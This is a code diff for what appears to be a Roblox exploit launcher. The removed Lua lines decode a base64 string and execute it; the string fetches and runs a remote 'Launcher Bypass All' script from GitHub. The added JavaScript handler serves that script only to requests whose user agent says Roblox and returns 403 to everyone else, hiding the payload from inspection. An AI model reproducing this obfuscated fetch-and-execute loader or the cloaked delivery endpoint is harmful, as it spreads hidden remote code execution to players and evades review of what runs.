@@ -1,17 +1,15 @@
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-function d(s)
-    s = string.gsub(s, '[^'..b..'=]', '')
-    return (s:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0') end
-        return r;
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0) end
-        return string.char(c)
-    end))
-end
+export default async function handler(req, res) {
+  const userAgent = req.headers['user-agent']?.toLowerCase() || "";
 
-loadstring(d("bG9hZHN0cmluZyhhZ2FtZTpIdHRwR2V0KCJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYnVzaW5lc3NtYW5hbGV4ODgtc3RhY2svQnlwYXNzV2hvQW1JL21haW4vTGF1bmNoZXIlMjBCeXBhc3MlMjBBbGwiKSkoKQ=="))()
+  // Blokir akses jika bukan dari Roblox Executor
+  if (!userAgent.includes("roblox")) {
+    return res.status(403).send("Access Denied");
+  }
+
+  // Ambil script dari GitHub
+  const response = await fetch("https://raw.githubusercontent.com/businessmanalex88-stack/BypassWhoAmI/refs/heads/main/Launcher%20Bypass%20All");
+  const code = await response.text();
+
+  res.setHeader("Content-Type", "text/plain");
+  res.send(code);
+}
